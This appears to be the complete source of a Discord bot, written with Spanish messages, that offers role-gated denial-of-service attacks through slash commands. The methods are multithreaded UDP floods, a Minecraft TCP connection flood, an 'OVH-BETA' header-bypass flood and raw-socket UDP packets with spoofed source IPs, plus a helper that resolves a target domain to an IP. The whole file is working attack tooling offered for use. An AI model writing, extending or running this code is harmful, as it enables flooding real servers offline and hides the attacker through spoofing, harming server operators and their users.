import discord
from discord import app_commands
import socket
import threading
import time
import random
import struct
import os

DISCORD_TOKEN = "TU_TOKEN"
VIP_ROLE_NAME = "RANK VIP"
THREADS = 200

active_attacks = []

intents = discord.Intents.default()
intents.guilds = True
intents.members = True
bot = discord.Client(intents=intents)
tree = app_commands.CommandTree(bot)

# Función para generar checksums
def checksum(data):
    res = 0
    n = len(data) % 2
    for i in range(0, len(data) - n, 2):
        res += (data[i] << 8) + (data[i+1])
    if n:
        res += (data[-1] << 8)
    while res >> 16:
        res = (res & 0xFFFF) + (res >> 16)
    return ~res & 0xFFFF

# UDP spoofing real con encabezado IP y UDP manual
def udp_spoof(ip, port, duration, control_flag):
    timeout = time.time() + duration
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
    except PermissionError:
        print("[ERROR] Ejecuta el script como root para usar raw sockets.")
        return

    while time.time() < timeout and control_flag['run']:
        spoof_ip = f"{random.randint(1, 254)}.{random.randint(0, 255)}.{random.randint(0, 255)}.{random.randint(1, 254)}"
        payload = random._urandom(65500)
        source_ip = socket.inet_aton(spoof_ip)
        dest_ip = socket.inet_aton(ip)

        # IP Header
        ip_header = struct.pack(
            "!BBHHHBBH4s4s",
            69, 0, 20 + 8 + len(payload), random.randint(0, 65535), 0, 255, socket.IPPROTO_UDP, 0,
            source_ip, dest_ip
        )

        # UDP Header
        src_port = random.randint(1024, 65535)
        udp_len = 8 + len(payload)
        udp_header = struct.pack("!HHHH", src_port, port, udp_len, 0)

        packet = ip_header + udp_header + payload

        try:
            sock.sendto(packet, (ip, port))
        except:
            pass

def udp_flood(ip, port, duration, control_flag):
    timeout = time.time() + duration
    payload = random._urandom(65500)
    while time.time() < timeout and control_flag['run']:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            dynamic_port = port + random.randint(-5, 5)
            sock.sendto(payload, (ip, dynamic_port))
        except:
            pass

def tcp_flood_minecraft(ip, port, duration, control_flag):
    timeout = time.time() + duration
    fake_packet = b'\x00\x00\x04\x4d\x43\x50\x49\x4e\x47' * 5
    while time.time() < timeout and control_flag['run']:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            sock.settimeout(1)
            sock.connect((ip, port))
            sock.sendall(fake_packet)
            time.sleep(0.01)
            sock.close()
        except:
            pass

def attack_mc(ip, port, duration, control_flag):
    def udp_thread():
        udp_flood(ip, port, duration, control_flag)
    def tcp_thread():
        tcp_flood_minecraft(ip, port, duration, control_flag)

    for _ in range(THREADS // 2):
        t1 = threading.Thread(target=udp_thread)
        t2 = threading.Thread(target=tcp_thread)
        t1.start()
        t2.start()
        active_attacks.append((t1, control_flag))
        active_attacks.append((t2, control_flag))

def udp_mix(ip, port, duration, control_flag):
    timeout = time.time() + duration
    payload = random._urandom(65500)
    while time.time() < timeout and control_flag['run']:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            dynamic_port = port + random.randint(-10, 10)
            sock.sendto(payload, (ip, dynamic_port))
        except:
            pass

def ovh_beta(ip, port, duration, control_flag):
    timeout = time.time() + duration
    while time.time() < timeout and control_flag['run']:
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
            fake_header = b"\x08\x00" + random._urandom(10)
            payload = fake_header + random._urandom(65500 - len(fake_header))
            sock.sendto(payload, (ip, port + random.randint(-20, 20)))
        except:
            pass

@tree.command(name="ddos", description="Inicia un ataque L4 potente")
@app_commands.describe(
    method="Método: MC, UDP-MIX, OVH-BETA o UDP-SPOOF",
    ip="IP del objetivo",
    port="Puerto",
    time="Tiempo en segundos"
)
async def ddos(interaction: discord.Interaction, method: str, ip: str, port: int, time: int):
    user_roles = [role.name for role in interaction.user.roles]
    if VIP_ROLE_NAME not in user_roles:
        await interaction.response.send_message("No tienes el rol RANK VIP.", ephemeral=True)
        return

    if method.upper() not in ["MC", "UDP-MIX", "OVH-BETA", "UDP-SPOOF"]:
        await interaction.response.send_message("Método inválido. Usa /methods.", ephemeral=True)
        return

    await interaction.response.send_message(
        f"**TYPE: L4**\n"
        f"IP: `{ip}`\n"
        f"PORT: `{port}`\n"
        f"TIME: `{time}` segundos\n"
        f"METHOD: `{method.upper()}`\n"
        f"Status: **Enviando ataque...**"
    )

    control_flag = {'run': True}

    def run():
        if method.upper() == "MC":
            attack_mc(ip, port, time, control_flag)
        elif method.upper() == "UDP-MIX":
            for _ in range(THREADS):
                t = threading.Thread(target=udp_mix, args=(ip, port, time, control_flag))
                t.start()
                active_attacks.append((t, control_flag))
        elif method.upper() == "OVH-BETA":
            for _ in range(THREADS):
                t = threading.Thread(target=ovh_beta, args=(ip, port, time, control_flag))
                t.start()
                active_attacks.append((t, control_flag))
        elif method.upper() == "UDP-SPOOF":
            for _ in range(THREADS):
                t = threading.Thread(target=udp_spoof, args=(ip, port, time, control_flag))
                t.start()
                active_attacks.append((t, control_flag))

    threading.Thread(target=run).start()

@tree.command(name="stop", description="Detiene todos los ataques activos")
async def stop_attack(interaction: discord.Interaction):
    for t, flag in active_attacks:
        flag['run'] = False
    active_attacks.clear()
    await interaction.response.send_message("Todos los ataques han sido detenidos.")

@tree.command(name="methods", description="Ver métodos disponibles")
async def methods(interaction: discord.Interaction):
    await interaction.response.send_message(
        "**Métodos disponibles:**\n"
        "`MC` (Minecraft boost)\n"
        "`UDP-MIX` (Flood masivo)\n"
        "`OVH-BETA` (Header Bypass)\n"
        "`UDP-SPOOF` (Spoofing real con raw sockets)"
    )

@tree.command(name="ip", description="Resuelve un dominio a IP")
@app_commands.describe(host="Dominio (ej: play.example.com)")
async def ip_lookup(interaction: discord.Interaction, host: str):
    try:
        resolved = socket.gethostbyname(host)
        await interaction.response.send_message(f"`{host}` → `{resolved}`")
    except Exception as e:
        await interaction.response.send_message(f"Error: {e}", ephemeral=True)

@bot.event
async def on_ready():
    await tree.sync()
    print(f"Bot conectado como {bot.user}")

bot.run(DISCORD_TOKEN)
